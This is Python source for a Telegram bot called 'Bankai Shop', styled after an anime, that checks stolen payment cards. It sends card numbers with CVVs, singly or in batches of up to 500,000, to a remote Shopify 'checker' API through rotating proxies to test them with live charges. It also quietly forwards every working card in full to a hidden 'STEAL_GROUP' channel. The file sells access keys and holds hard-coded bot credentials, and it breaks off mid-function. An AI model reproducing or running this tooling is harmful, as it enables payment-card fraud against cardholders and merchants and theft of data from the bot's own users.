#!/usr/bin/env python3
"""
🔥 BANKAI SHOP 🔥
Bleach Anime x Shopify Card Checker
Soul Reaper Grade Checker - Powered by Zanpakuto Engine
"""

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime

# ============================================================================
# ⚙️ CONFIGURATION - ADD YOUR CREDENTIALS HERE
# ============================================================================

BOT_TOKEN  = '8692888647:AAGBRVuhOBnNe5jIi71o7sLBAYOY6JBsevQ'
API_ID     = 32253547
API_HASH   = '868242502bea6a1e41b2ce46001d0580'

# Second file's API endpoint (deploy auto.py on Railway and paste URL here)
CHECKER_API = 'https://web-production-1b828.up.railway.app/shopify'

OWNER_ID       = 5895386985
STEAL_GROUP    = -1003769047965   # hits forwarded here
PREMIUM_FILE   = 'bankai_premium.txt'
PROXY_FILE     = 'proxy.txt'
SOULS_FILE     = 'soul_data.json'
KEYS_FILE      = 'bankai_keys.json'

# ============================================================================
# 🌟 SOUL DATA MANAGEMENT
# ============================================================================

def load_souls():
    if not os.path.exists(SOULS_FILE):
        return {}
    try:
        with open(SOULS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_souls(data):
    with open(SOULS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def get_soul(user_id):
    souls = load_souls()
    uid = str(user_id)
    if uid not in souls:
        souls[uid] = {
            "checks": 0, "charged": 0,
            "approved": 0, "declined": 0,
            "reiatsu": 0, "joined": datetime.now().isoformat()
        }
        save_souls(souls)
    return souls[uid]

def update_soul(user_id, soul):
    souls = load_souls()
    souls[str(user_id)] = soul
    save_souls(souls)

# ============================================================================
# 🔑 KEY MANAGEMENT
# ============================================================================

def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_keys(data):
    with open(KEYS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def generate_key():
    import secrets, string
    chars = string.ascii_uppercase + string.digits
    parts = [''.join(secrets.choice(chars) for _ in range(4)) for _ in range(4)]
    return 'BANKAI-' + '-'.join(parts)

PREMIUM_DATA_FILE = 'bankai_premium_data.json'

def load_premium_data():
    if not os.path.exists(PREMIUM_DATA_FILE):
        return {}
    try:
        with open(PREMIUM_DATA_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_premium_data(data):
    with open(PREMIUM_DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def add_premium(user_id: int, days: int = 0):
    """days=0 means permanent."""
    data = load_premium_data()
    uid  = str(user_id)
    if days > 0:
        from datetime import timedelta
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
    else:
        expiry = None
    data[uid] = {'expires': expiry, 'added': datetime.now().isoformat()}
    save_premium_data(data)

def get_rank(soul):
    c = soul['checks']
    if c < 10:   return "👨‍🎓 Academy Student"
    elif c < 50: return "⚔️ Seated Officer"
    elif c < 150:return "👑 Captain"
    elif c < 300:return "⚫ Kenpachi"
    else:        return "🌟 Royal Guard Zero Squad"

def get_reiatsu_bar(pct):
    filled = int(pct / 10)
    bar = "█" * filled + "░" * (10 - filled)
    return f"[{bar}] {pct}%"

# ============================================================================
# 🔐 PREMIUM CHECK
# ============================================================================

def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    try:
        with open(PROXY_FILE, 'r') as f:
            return [l.strip() for l in f if l.strip()]
    except:
        return []

def save_proxies(proxies):
    with open(PROXY_FILE, 'w') as f:
        f.write('\n'.join(proxies) + '\n')

def is_premium(user_id):
    if user_id == OWNER_ID:
        return True
    uid  = str(user_id)
    data = load_premium_data()
    if uid in data:
        expiry = data[uid].get('expires')
        if expiry is None:
            return True
        return datetime.fromisoformat(expiry) > datetime.now()
    # fallback: old text file for permanent users
    if os.path.exists(PREMIUM_FILE):
        try:
            with open(PREMIUM_FILE, 'r') as f:
                return uid in [l.strip() for l in f]
        except:
            pass
    return False

def get_premium_expiry(user_id) -> str:
    uid  = str(user_id)
    data = load_premium_data()
    if uid not in data:
        if os.path.exists(PREMIUM_FILE):
            try:
                with open(PREMIUM_FILE, 'r') as f:
                    if uid in [l.strip() for l in f]:
                        return "♾️ Permanent"
            except:
                pass
        return "None"
    expiry = data[uid].get('expires')
    if expiry is None:
        return "♾️ Permanent"
    dt = datetime.fromisoformat(expiry)
    remaining = (dt - datetime.now()).days
    return f"📅 {dt.strftime('%Y-%m-%d')} ({remaining}d left)"

def extract_cards(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for card, mm, yy, cvv in matches:
        if len(yy) == 2:
            yy = '20' + yy
        cards.append(f"{card}|{mm}|{yy}|{cvv}")
    return cards

# ============================================================================
# ⚔️ ZANPAKUTO CHECKER ENGINE (Calls second file API)
# ============================================================================

async def zanpakuto_check(card: str, proxy: str = "") -> dict:
    """Call the Shopify checker API (second file / Railway endpoint)"""
    try:
        params = {'cc': card}
        if proxy:
            params['proxy'] = proxy

        timeout = aiohttp.ClientTimeout(total=35)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API, params=params) as resp:
                data = await resp.json(content_type=None)

        response  = str(data.get('Response', '')).upper()
        status    = data.get('Status', '')
        gate      = data.get('Gate', 'Shopify')
        price     = data.get('Price', '?')
        site      = data.get('Site', '-')
        elapsed   = data.get('Time', '-')
        receipt   = data.get('Receipt', '')
        error_detail = data.get('ErrorDetail', '') or data.get('Status', '') or response
        charged   = str(data.get('Charged', 'False')).lower() == 'true'
        approved  = str(data.get('Approved', 'False')).lower() == 'true'

        # Flexible matching — catch all API response variations
        if charged or 'CHARGED' in response:
            return {'status': 'CHARGED', 'gate': gate, 'price': price,
                    'site': site, 'time': elapsed, 'receipt': receipt,
                    'raw': response, 'code': status or response}

        if approved or 'APPROVED' in response:
            return {'status': 'APPROVED', 'gate': gate, 'price': price,
                    'site': site, 'time': elapsed, 'raw': response,
                    'code': status or response}

        if any(x in response for x in ('DECLINE', 'DECLINED', 'CARD DECLINED', 'DO NOT HONOR',
                                        'INSUFFICIENT', 'INVALID', 'STOLEN', 'LOST',
                                        'EXPIRED', 'PICKUP', 'BLOCKED', 'RESTRICTED')):
            return {'status': 'DECLINED', 'gate': gate, 'price': price,
                    'site': site, 'time': elapsed, 'raw': response,
                    'code': status or error_detail or response}

        # Still an error — but show full details for debugging
        return {'status': 'ERROR', 'gate': gate, 'price': '?',
                'site': site, 'time': elapsed, 'raw': response,
                'code': error_detail or response or 'Unknown error from API'}

    except asyncio.TimeoutError:
        return {'status': 'TIMEOUT', 'raw': 'Zanpakuto timed out', 'gate': '-',
                'price': '-', 'site': '-', 'time': '-', 'code': 'TIMEOUT'}
    except Exception as e:
        return {'status': 'ERROR', 'raw': str(e), 'gate': '-',
                'price': '-', 'site': '-', 'time': '-', 'code': 'EXCEPTION'}

async def forward_hit(card: str, result: dict, user_id: int, bin_info: dict = {}):
    """Forward CHARGED/APPROVED hits to the steal group."""
    st       = result['status']
    emoji    = "💎" if st == 'CHARGED' else "✅"
    label    = "CHARGED — ORDER PLACED" if st == 'CHARGED' else "APPROVED — CCN LIVE"
    bank     = bin_info.get('bank', '—')
    brand    = bin_info.get('brand', '—')
    country  = bin_info.get('country_name', '—')
    flag     = bin_info.get('country_flag', '')

    msg = (
        f"<b>{emoji} 『 BANKAI HIT 』 {emoji}</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        f"<b>⚫ Status:</b>  {label}\n"
        f"<b>💳 Card:</b>   <code>{card}</code>\n"
        f"<b>🏦 Gate:</b>   {result.get('gate', '—')}\n"
        f"<b>💰 Price:</b>  {result.get('price', '—')}\n"
        f"<b>🌐 Site:</b>   {result.get('site', '—')}\n"
        f"<b>⏱️ Time:</b>   {result.get('time', '—')}\n\n"
        f"<b>🏦 Bank:</b>   {bank}\n"
        f"<b>💠 Brand:</b>  {brand} {flag}\n"
        f"<b>🌍 Country:</b>{country}\n\n"
        f"<b>👤 Checker:</b> <code>{user_id}</code>"
    )
    if st == 'CHARGED' and result.get('receipt'):
        msg += f"\n<b>🧾 Receipt:</b> {result['receipt']}"

    try:
        await bot.send_message(STEAL_GROUP, msg, parse_mode='html')
    except Exception:
        pass

async def get_bin_info(card_number: str) -> dict:
    """Get BIN info"""
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{card_number[:6]}') as res:
                if res.status == 200:
                    return await res.json()
    except:
        pass
    return {}

# ============================================================================
# 🎮 BOT INIT
# ============================================================================

SESSION_STRING = os.environ.get('SESSION_STRING', '')
_session = StringSession(SESSION_STRING) if SESSION_STRING else StringSession()
bot = TelegramClient(_session, API_ID, API_HASH).start(bot_token=BOT_TOKEN)

if not SESSION_STRING:
    _saved = bot.session.save()
    print("\n" + "=" * 60)
    print("⚠️  SESSION_STRING is not set!")
    print("Copy the string below and add it to Railway Variables")
    print("as SESSION_STRING then redeploy:")
    print("=" * 60)
    print(_saved)
    print("=" * 60 + "\n")

active_sessions = {}

# ============================================================================
# ⛩️ /start - SOUL SOCIETY PORTAL
# ============================================================================

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    user_id = event.sender_id
    soul    = get_soul(user_id)
    rank    = get_rank(soul)
    bar     = get_reiatsu_bar(soul['reiatsu'])

    buttons = [
        [
            Button.inline("⚔️  𝗭𝗔𝗡𝗣𝗔𝗞𝗨𝗧𝗢  ⚔️", data=b"zanpakuto"),
        ],
        [
            Button.inline("🌟 𝗦𝗢𝗨𝗟 𝗣𝗢𝗪𝗘𝗥", data=b"reiatsu"),
            Button.inline("📊 𝗦𝗧𝗔𝗧𝗦", data=b"stats"),
        ],
        [
            Button.inline("🔥 𝗕𝗔𝗡𝗞𝗔𝗜 𝗠𝗢𝗗𝗘", data=b"bankai"),
            Button.inline("👻 𝗣𝗥𝗢𝗫𝗬", data=b"proxy_info"),
        ],
        [
            Button.inline("⛩️  𝗦𝗢𝗨𝗟 𝗦𝗢𝗖𝗜𝗘𝗧𝗬  ⛩️", data=b"society"),
        ],
    ]

    await event.reply(
        f"<b>『 🔥 𝗕𝗔𝗡𝗞𝗔𝗜 𝗦𝗛𝗢𝗣 🔥 』</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        f"<b>⚫ Soul ID:</b> <code>{user_id}</code>\n"
        f"<b>⚔️ Rank:</b> {rank}\n"
        f"<b>💜 Reiatsu:</b> {bar}\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        f"<b>⚪ Tensa Zangetsu</b> → Single Check\n"
        f"<b>🔴 Ryūjin Jakka</b>  → Batch Check\n"
        f"<b>🔵 Sōgyo no Kotowari</b> → Proxy\n"
        f"<b>💜 Kyōka Suigetsu</b> → Stats\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>🌟 Powered by Zanpakuto Engine</b>",
        parse_mode='html',
        buttons=buttons
    )

# ============================================================================
# ⚔️ /cc - SINGLE CARD CHECK
# ============================================================================

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def check_single(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(
            "<b>⛔ REIATSU INSUFFICIENT</b>\n\n"
            "Only Soul Reapers with Bankai access can use this.\n"
            "Contact Soul Society admin.",
            parse_mode='html'
        )
        return

    card = event.message.text.replace('/cc ', '').strip()
    if not re.match(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', card):
        await event.reply(
            "<b>❌ Invalid Zanpakuto Format</b>\n\n"
            "Use: <code>/cc CARD|MM|YY|CVV</code>\n"
            "Example: <code>/cc 4111111111111111|12|25|123</code>",
            parse_mode='html'
        )
        return

    proxies = load_proxies()
    proxy   = random.choice(proxies) if proxies else ""

    status_msg = await event.reply(
        "<b>🗡️ Zanpakuto Awakening...</b>\n"
        "<b>⚡ Charging Reiatsu...</b>\n"
        "<b>🌀 Initiating Bankai Sequence...</b>",
        parse_mode='html'
    )

    try:
        result   = await zanpakuto_check(card, proxy)
        bin_info = await get_bin_info(card.split('|')[0])

        card_num    = card.split('|')[0]
        masked      = f"{card_num[:6]}{'★'*6}{card_num[-4:]}"
        bank        = bin_info.get('bank', '—')
        brand       = bin_info.get('brand', '—')
        country     = bin_info.get('country_name', '—')
        flag        = bin_info.get('country_flag', '')
        card_type   = bin_info.get('type', '—')
        level       = bin_info.get('level', '—')

        # Status styling
        st = result['status']
        if st == 'CHARGED':
            status_line = "💎 CHARGED ─ ORDER PLACED"
            border      = "═" * 22
        elif st == 'APPROVED':
            status_line = "✅ APPROVED ─ CCN LIVE"
            border      = "─" * 22
        elif st == 'DECLINED':
            status_line = "❌ DECLINED ─ CARD DEAD"
            border      = "─" * 22
        elif st == 'TIMEOUT':
            status_line = "⏳ TIMEOUT ─ SITE DEAD"
            border      = "─" * 22
        else:
            status_line = f"⚠️ ERROR ─ {st}"
            border      = "─" * 22

        # Update soul
        soul = get_soul(user_id)
        soul['checks'] += 1
        if st == 'CHARGED':
            soul['charged'] += 1
            soul['reiatsu'] = min(100, soul['reiatsu'] + 10)
        elif st == 'APPROVED':
            soul['approved'] += 1
            soul['reiatsu'] = min(100, soul['reiatsu'] + 5)
        else:
            soul['declined'] += 1
            soul['reiatsu'] = min(100, soul['reiatsu'] + 1)
        update_soul(user_id, soul)

        out = (
            f"<b>『 ⚔️ ZANPAKUTO RESULT 』</b>\n"
            f"<b>{border}</b>\n\n"
            f"<b>⚫ Status:</b>  {status_line}\n"
            f"<b>💳 Card:</b>   <code>{masked}</code>\n"
            f"<b>🏦 Gate:</b>   {result['gate']}\n"
            f"<b>💰 Price:</b>  {result['price']}\n"
            f"<b>🌐 Site:</b>   {result['site']}\n"
            f"<b>⏱️ Time:</b>   {result['time']}\n\n"
            f"<b>━━━━━━ BIN INFO ━━━━━━</b>\n"
            f"<b>🏦 Bank:</b>   {bank}\n"
            f"<b>💠 Brand:</b>  {brand} {flag}\n"
            f"<b>🌍 Country:</b>{country}\n"
            f"<b>📋 Type:</b>   {card_type} | {level}\n\n"
            f"<b>━━━━━━ RESPONSE ━━━━━━</b>\n"
            f"<code>{(result.get('code') or result.get('raw') or 'No details')[:180]}</code>\n\n"
            f"<b>💜 Reiatsu:</b> {get_reiatsu_bar(soul['reiatsu'])}"
        )

        if st == 'CHARGED' and result.get('receipt'):
            out += f"\n<b>🧾 Receipt:</b> {result['receipt']}"

        await status_msg.edit(out, parse_mode='html')

        if st in ('CHARGED', 'APPROVED'):
            await forward_hit(card, result, user_id, bin_info)

    except Exception as e:
        await status_msg.edit(
            f"<b>❌ Zanpakuto Malfunction</b>\n\n<code>{str(e)[:150]}</code>",
            parse_mode='html'
        )

# ============================================================================
# 📄 /chk - BATCH CHECK FROM FILE
# ============================================================================

@bot.on(events.NewMessage(pattern=r'^/chk'))
async def check_file(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply("<b>⛔ Bankai Access Required</b>", parse_mode='html')
        return

    if not event.reply_to_msg_id:
        await event.reply("<b>❌ Reply to a .txt file containing cards</b>", parse_mode='html')
        return

    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply("<b>❌ Must be a .txt file</b>", parse_mode='html')
        return

    proxies    = load_proxies()
    status_msg = await event.reply("<b>🌀 Soul Society processing file...</b>", parse_mode='html')
    file_path  = await reply.download_media()

    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()

        cards = extract_cards(content)
        if not cards:
            await status_msg.edit("<b>❌ No valid cards found in file</b>", parse_mode='html')
            return

        total   = min(len(cards), 500000)
        results = {'charged': 0, 'approved': 0, 'declined': 0, 'error': 0,
                   'checked': 0, 'start': time.time()}
        hits    = []

        sid = f"{user_id}_{status_msg.id}"
        active_sessions[sid] = {'paused': False, 'stopped': False}

        await status_msg.edit(
            f"<b>🔥 BANKAI BATCH MODE ACTIVATED</b>\n\n"
            f"<b>⚔️ Cards:</b> {total}\n"
            f"<b>🌀 Initializing Zanpakuto Engine...</b>",
            parse_mode='html'
        )

        buttons = [
            [
                Button.inline("⏸️ Pause", data=f"pause_{sid}".encode()),
                Button.inline("🛑 Stop",  data=f"stop_{sid}".encode()),
            ]
        ]

        for card in cards[:total]:
            if sid not in active_sessions or active_sessions[sid]['stopped']:
                break
            while active_sessions[sid]['paused']:
                await asyncio.sleep(1)

            proxy  = random.choice(proxies) if proxies else ""
            result = await zanpakuto_check(card, proxy)
            st     = result['status']

            if st == 'CHARGED':
                results['charged'] += 1
                hits.append(f"💎 CHARGED | {card} | {result['site']} | {result['price']}")
                await forward_hit(card, result, user_id)
            elif st == 'APPROVED':
                results['approved'] += 1
                hits.append(f"✅ APPROVED | {card} | {result['site']}")
                await forward_hit(card, result, user_id)
            elif st == 'DECLINED':
                results['declined'] += 1
            else:
                results['error'] += 1

            results['checked'] += 1

            if results['checked'] % 15 == 0:
                elapsed = int(time.time() - results['start'])
                total_done = results['checked']
                pct = int(total_done / total * 100)
                prog_bar = "█" * int(pct/10) + "░" * (10 - int(pct/10))

                await status_msg.edit(
                    f"<b>『 🔥 BANKAI BATCH ACTIVE 』</b>\n\n"
                    f"<b>Progress:</b> [{prog_bar}] {pct}%\n"
                    f"<b>Checked:</b>  {total_done}/{total}\n\n"
                    f"<b>💎 Charged:</b>  {results['charged']}\n"
                    f"<b>✅ Approved:</b> {results['approved']}\n"
                    f"<b>❌ Declined:</b> {results['declined']}\n"
                    f"<b>⚠️ Errors:</b>   {results['error']}\n\n"
                    f"<b>⏱️ Time:</b> {elapsed}s",
                    parse_mode='html',
                    buttons=buttons
                )

        elapsed = int(time.time() - results['start'])
        final   = (
            f"<b>『 ✅ BANKAI COMPLETE 』</b>\n\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>Total:</b>    {total}\n"
            f"<b>Checked:</b>  {results['checked']}\n\n"
            f"<b>💎 Charged:</b>  {results['charged']}\n"
            f"<b>✅ Approved:</b> {results['approved']}\n"
            f"<b>❌ Declined:</b> {results['declined']}\n"
            f"<b>⚠️ Errors:</b>   {results['error']}\n\n"
            f"<b>⏱️ Time:</b> {elapsed}s"
        )

        if hits:
            final += "\n\n<b>━━━━━ HITS ━━━━━</b>\n"
            final += "\n".join(hits[:20])

        await status_msg.edit(final, parse_mode='html')

        if sid in active_sessions:
            del active_sessions[sid]

    except Exception as e:
        await status_msg.edit(f"<b>❌ Error: {str(e)[:100]}</b>", parse_mode='html')
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# ============================================================================
# 🎮 CALLBACK HANDLERS
# ============================================================================

@bot.on(events.CallbackQuery(pattern=b"zanpakuto"))
async def zanpakuto_menu(event):
    buttons = [
        [Button.inline("⚪ Tensa Zangetsu — Single Check",   data=b"usage_cc")],
        [Button.inline("🔴 Ryūjin Jakka — Batch Check",      data=b"usage_chk")],
        [Button.inline("🔵 Sōgyo no Kotowari — Proxy Info",  data=b"proxy_info")],
        [Button.inline("💜 Kyōka Suigetsu — My Stats",       data=b"stats")],
        [Button.inline("🟡 Katen Kyōkotsu — API Status",     data=b"api_status")],
        [Button.inline("🔙 Back", data=b"back_start")],
    ]

    await event.edit(
        "<b>⚔️ 『 ZANPAKUTO ARSENAL 』</b>\n\n"
        "<b>Choose your spirit sword:</b>\n\n"
        "⚪ <b>Tensa Zangetsu</b>\n"
        "└ Check single card\n\n"
        "🔴 <b>Ryūjin Jakka</b>\n"
        "└ Batch check from .txt file\n\n"
        "🔵 <b>Sōgyo no Kotowari</b>\n"
        "└ Proxy management\n\n"
        "💜 <b>Kyōka Suigetsu</b>\n"
        "└ View your soul stats\n\n"
        "🟡 <b>Katen Kyōkotsu</b>\n"
        "└ Check API online status",
        parse_mode='html',
        buttons=buttons
    )
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"usage_cc"))
async def usage_cc(event):
    await event.edit(
        "<b>⚪ 𝗧𝗲𝗻𝘀𝗮 𝗭𝗮𝗻𝗴𝗲𝘁𝘀𝘂 — Single Check</b>\n\n"
        "<b>Command:</b>\n"
        "<code>/cc CARD|MM|YY|CVV</code>\n\n"
        "<b>Example:</b>\n"
        "<code>/cc 4111111111111111|12|25|123</code>\n\n"
        "<b>Returns:</b>\n"
        "• Status (Charged/Approved/Declined)\n"
        "• Gateway & Price\n"
        "• BIN Info (Bank, Brand, Country)\n"
        "• Response code\n"
        "• Reiatsu update",
        parse_mode='html',
        buttons=[[Button.inline("🔙 Back", data=b"zanpakuto")]]
    )
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"usage_chk"))
async def usage_chk(event):
    await event.edit(
        "<b>🔴 𝗥𝘆ū𝗷𝗶𝗻 𝗝𝗮𝗸𝗸𝗮 — Batch Check</b>\n\n"
        "<b>How to use:</b>\n"
        "1. Upload a .txt file with cards\n"
        "2. Reply to that file with <code>/chk</code>\n\n"
        "<b>Card format in file:</b>\n"
        "<code>4111111111111111|12|25|123</code>\n\n"
        "<b>Features:</b>\n"
        "• Live progress bar\n"
        "• Pause / Stop controls\n"
        "• Hits summary at end\n"
        "• Reiatsu gained per check",
        parse_mode='html',
        buttons=[[Button.inline("🔙 Back", data=b"zanpakuto")]]
    )
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"stats"))
async def stats_handler(event):
    user_id = event.sender_id
    soul    = get_soul(user_id)
    rank    = get_rank(soul)
    bar     = get_reiatsu_bar(soul['reiatsu'])

    total = soul['checks']
    hr    = f"{soul['charged']/total*100:.1f}%" if total > 0 else "0%"
    ar    = f"{soul['approved']/total*100:.1f}%" if total > 0 else "0%"

    await event.edit(
        f"<b>📊 『 SOUL STATS 』</b>\n\n"
        f"<b>⚔️ Rank:</b>     {rank}\n"
        f"<b>💜 Reiatsu:</b>  {bar}\n\n"
        f"<b>━━━━━━ CHECKER ━━━━━━</b>\n"
        f"<b>Total Checks:</b>  {soul['checks']}\n"
        f"<b>💎 Charged:</b>    {soul['charged']} ({hr})\n"
        f"<b>✅ Approved:</b>   {soul['approved']} ({ar})\n"
        f"<b>❌ Declined:</b>   {soul['declined']}\n\n"
        f"<b>━━━━━ NEXT RANK ━━━━━</b>\n"
        f"<b>Checks to next rank:</b> {max(0, [10,50,150,300][min(3, ['Academy','Seated','Captain','Kenpachi'].index(rank.split()[0]) if any(x in rank for x in ['Academy','Seated','Captain','Kenpachi']) else 3)] - soul['checks'])}",
        parse_mode='html',
        buttons=[[Button.inline("🔙 Back", data=b"back_start")]]
    )
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"reiatsu"))
async def reiatsu_handler(event):
    user_id = event.sender_id
    soul    = get_soul(user_id)
    pct     = soul['reiatsu']
    bar     = get_reiatsu_bar(pct)

    if pct < 20:   lvl = "🟦 Academy Student"
    elif pct < 40: lvl = "🟩 Seated Officer"
    elif pct < 60: lvl = "🟪 Captain Class"
    elif pct < 80: lvl = "🟥 Kenpachi Level"
    else:          lvl = "⭐ Zero Squad"

    await event.edit(
        f"<b>💜 『 REIATSU POWER 』</b>\n\n"
        f"<b>Level:</b>  {lvl}\n"
        f"<b>Power:</b>  {bar}\n\n"
        f"<b>How to raise Reiatsu:</b>\n"
        f"⚡ Charged = +10%\n"
        f"✅ Approved = +5%\n"
        f"❌ Declined = +1%",
        parse_mode='html',
        buttons=[[Button.inline("🔙 Back", data=b"back_start")]]
    )
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"bankai"))
async def bankai_handler(event):
    user_id = event.sender_id
    prem    = is_premium(user_id)

    if prem:
        expiry = get_premium_expiry(user_id)
        msg = (
            "<b>🔥 『 BANKAI ACTIVE 』🔥</b>\n\n"
            "✅ Full Zanpakuto Arsenal unlocked\n"
            "✅ Unlimited checks\n"
            "✅ Batch processing\n"
            "✅ Priority routing\n\n"
            f"<b>📅 Access expires:</b> {expiry}\n\n"
            "<b>⚫ You are a true Soul Reaper!</b>"
        )
    else:
        msg = (
            "<b>🔥 『 BANKAI MODE 』🔥</b>\n\n"
            "⛔ <b>Reiatsu Seal Active</b>\n\n"
            "Bankai requires premium access.\n"
            "Contact Soul Society admin to unlock.\n\n"
            "<b>Premium unlocks:</b>\n"
            "• /cc single check\n"
            "• /chk batch check\n"
            "• Full Zanpakuto Arsenal\n"
            "• Unlimited usage"
        )

    await event.edit(msg, parse_mode='html', buttons=[[Button.inline("🔙 Back", data=b"back_start")]])
    await event.answer("🔥 BANKAI!", alert=not prem)

@bot.on(events.CallbackQuery(pattern=b"proxy_info"))
async def proxy_info_handler(event):
    proxies = load_proxies()
    await event.edit(
        f"<b>🔵 『 PROXY STATUS 』</b>\n\n"
        f"<b>Loaded proxies:</b> {len(proxies)}\n\n"
        f"<b>Format:</b>\n"
        f"<code>ip:port:user:pass</code>\n\n"
        f"<b>Add proxies via command:</b>\n"
        f"<code>/addproxy\n"
        f"ip:port:user:pass\n"
        f"ip:port:user:pass</code>\n\n"
        f"<b>Clear all:</b> <code>/clearproxy</code>",
        parse_mode='html',
        buttons=[[Button.inline("🔙 Back", data=b"back_start")]]
    )
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"api_status"))
async def api_status_handler(event):
    await event.answer("🔄 Checking...", alert=False)
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API.replace('/shopify', '/health')) as resp:
                online = resp.status == 200
    except:
        online = False

    status = "✅ ONLINE" if online else "❌ OFFLINE"
    await event.edit(
        f"<b>🟡 『 API STATUS 』</b>\n\n"
        f"<b>Zanpakuto Engine:</b> {status}\n"
        f"<b>Endpoint:</b> <code>{CHECKER_API}</code>",
        parse_mode='html',
        buttons=[[Button.inline("🔙 Back", data=b"zanpakuto")]]
    )

@bot.on(events.CallbackQuery(pattern=b"society"))
async def society_handler(event):
    souls = load_souls()
    total_users   = len(souls)
    total_checks  = sum(s.get('checks', 0) for s in souls.values())
    total_charged = sum(s.get('charged', 0) for s in souls.values())

    await event.edit(
        f"<b>⛩️ 『 SOUL SOCIETY STATS 』</b>\n\n"
        f"<b>👥 Total Reapers:</b> {total_users}\n"
        f"<b>⚔️ Total Checks:</b>  {total_checks}\n"
        f"<b>💎 Total Charged:</b> {total_charged}\n\n"
        f"<b>🌟 Powered by Zanpakuto Engine</b>",
        parse_mode='html',
        buttons=[[Button.inline("🔙 Back", data=b"back_start")]]
    )
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"back_start"))
async def back_start(event):
    await event.answer()
    await event.delete()
    await event.respond('/start')

# Pause/Stop session handlers
@bot.on(events.CallbackQuery(pattern=rb"pause_(.+)"))
async def pause_handler(event):
    sid = event.data.decode().replace("pause_", "")
    if sid in active_sessions:
        active_sessions[sid]['paused'] = not active_sessions[sid]['paused']
        state = "⏸️ Paused" if active_sessions[sid]['paused'] else "▶️ Resumed"
        await event.answer(state, alert=False)

@bot.on(events.CallbackQuery(pattern=rb"stop_(.+)"))
async def stop_handler(event):
    sid = event.data.decode().replace("stop_", "")
    if sid in active_sessions:
        active_sessions[sid]['stopped'] = True
        del active_sessions[sid]
    await event.answer("🛑 Stopping...", alert=False)

# ============================================================================
# 🌐 /addproxy - ADD PROXIES VIA TELEGRAM
# ============================================================================

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def addproxy_handler(event):
    if event.sender_id != OWNER_ID:
        await event.reply("<b>⛔ Owner only</b>", parse_mode='html')
        return

    text  = event.message.text.replace('/addproxy', '').strip()
    lines = [l.strip() for l in text.splitlines() if l.strip()]

    if not lines:
        await event.reply(
            "<b>🌐 Add Proxies</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/addproxy\n"
            "ip:port:user:pass\n"
            "ip:port:user:pass</code>\n\n"
            "Paste all proxies after the command.",
            parse_mode='html'
        )
        return

    existing = load_proxies()
    added    = 0
    for line in lines:
        if line not in existing:
            existing.append(line)
            added += 1
    save_proxies(existing)

    await event.reply(
        f"<b>✅ Proxies Updated</b>\n\n"
        f"<b>Added:</b> {added}\n"
        f"<b>Total:</b> {len(existing)}",
        parse_mode='html'
    )

@bot.on(events.NewMessage(pattern=r'^/clearproxy'))
async def clearproxy_handler(event):
    if event.sender_id != OWNER_ID:
        await event.reply("<b>⛔ Owner only</b>", parse_mode='html')
        return
    save_proxies([])
    await event.reply("<b>✅ All proxies cleared</b>", parse_mode='html')

# ============================================================================
# 🔑 /genkey - OWNER ONLY KEY GENERATOR
# ============================================================================

@bot.on(events.NewMessage(pattern=r'^/genkey'))
async def genkey_handler(event):
    user_id = event.sender_id
    if user_id != OWNER_ID:
        await event.reply("<b>⛔ Soul King Access Only</b>", parse_mode='html')
        return

    # Usage: /genkey [count] [days]
    # /genkey        → 1 key, permanent
    # /genkey 5      → 5 keys, permanent
    # /genkey 5 30   → 5 keys, 30 days each
    text  = event.message.text.strip().split()
    count = int(text[1]) if len(text) > 1 and text[1].isdigit() else 1
    days  = int(text[2]) if len(text) > 2 and text[2].isdigit() else 0
    count = min(count, 20)

    keys_data  = load_keys()
    new_keys   = []
    for _ in range(count):
        key = generate_key()
        keys_data[key] = {
            'used': False, 'used_by': None,
            'days': days,
            'created': datetime.now().isoformat()
        }
        new_keys.append(key)
    save_keys(keys_data)

    duration  = f"{days} days" if days > 0 else "♾️ Permanent"
    key_lines = '\n'.join(f"<code>{k}</code>" for k in new_keys)
    await event.reply(
        f"<b>🔑 『 SOUL KEYS GENERATED 』</b>\n\n"
        f"<b>Count:</b>    {count}\n"
        f"<b>Duration:</b> {duration}\n\n"
